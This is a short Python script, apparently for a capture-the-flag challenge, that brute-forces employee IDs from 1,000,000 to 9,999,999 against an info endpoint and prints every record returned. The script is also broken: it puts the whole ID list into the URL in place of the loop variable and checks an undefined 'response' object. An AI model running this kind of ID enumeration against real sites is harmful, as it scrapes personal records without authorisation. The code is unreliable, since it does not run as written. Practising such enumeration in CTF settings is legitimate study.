import requests


emp_id = list(range(1000000, 10000000))

for id in emp_id:
	url = f"https://www.wildberries-ctf.ru/info?employeeId={emp_id}"
	res = requests.get(url)
	
	if response.status_code == 200:
    		print(f"{emp_id}:")
    		print(res.text)
